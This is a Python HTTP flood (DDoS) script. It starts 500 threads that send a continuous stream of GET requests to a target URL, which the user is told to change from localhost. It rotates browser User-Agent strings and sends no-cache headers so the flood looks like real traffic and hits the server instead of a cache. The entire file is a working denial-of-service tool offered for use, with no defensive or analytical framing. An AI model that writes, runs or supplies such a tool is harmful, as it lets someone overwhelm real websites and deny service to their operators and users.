import threading
import requests
import time
import sys

# Target URL and port
TARGET_URL = "http://localhost:80"  # CHANGE THIS TO YOUR TARGET
THREADS = 500  # Number of concurrent threads
REQUESTS_PER_THREAD = 1000  # Number of requests each thread sends
ATTACK_DURATION = 60  # Attack duration in seconds (0 for infinite)

# User-Agent list to rotate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
]

# Global counter for requests sent
requests_sent = 0
attack_start_time = time.time()
stop_attack = threading.Event()

def http_flood_thread(thread_id):
    global requests_sent
    session = requests.Session()
    session.trust_env = False  # Prevent reading environment proxies

    while not stop_attack.is_set():
        if ATTACK_DURATION > 0 and (time.time() - attack_start_time) > ATTACK_DURATION:
            break

        try:
            headers = {
                'User-Agent': USER_AGENTS[thread_id % len(USER_AGENTS)],
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
            }
            response = session.get(TARGET_URL, headers=headers, timeout=5)
            # You can check response.status_code if needed, but for DDoS, we just care about sending
            # print(f"Thread {thread_id} sent request. Status: {response.status_code}")
            requests_sent += 1
        except requests.exceptions.Timeout:
            # print(f"Thread {thread_id}: Request timed out.")
            pass
        except requests.exceptions.ConnectionError as e:
            # print(f"Thread {thread_id}: Connection Error - {e}")
            pass
        except Exception as e:
            # print(f"Thread {thread_id}: An unexpected error occurred - {e}")
            pass
        
        # Optional: small delay to prevent being too aggressive and getting blocked too quickly
        # time.sleep(0.01)

def main():
    print(f"Starting HTTP flood attack on {TARGET_URL} with {THREADS} threads.")
    if ATTACK_DURATION > 0:
        print(f"Attack will run for {ATTACK_DURATION} seconds.")
    else:
        print("Attack will run indefinitely (or until stopped manually).")

    threads = []
    for i in range(THREADS):
        thread = threading.Thread(target=http_flood_thread, args=(i,))
        thread.daemon = True  # Allows main program to exit even if threads are running
        threads.append(thread)
        thread.start()

    try:
        while not stop_attack.is_set():
            if ATTACK_DURATION > 0 and (time.time() - attack_start_time) > ATTACK_DURATION:
                print("\nAttack duration complete. Stopping attack.")
                stop_attack.set()
                break
            
            # Print statistics every few seconds
            sys.stdout.write(f"\rRequests Sent: {requests_sent} | Active Threads: {threading.active_count() - 1}")
            sys.stdout.flush()
            time.sleep(1) # Update every second

    except KeyboardInterrupt:
        print("\nAttack interrupted by user. Stopping attack.")
        stop_attack.set()
    finally:
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=1) # Give threads a moment to finish
        print(f"\nTotal requests sent: {requests_sent}")
        print("Attack finished.")

if __name__ == "__main__":
    main()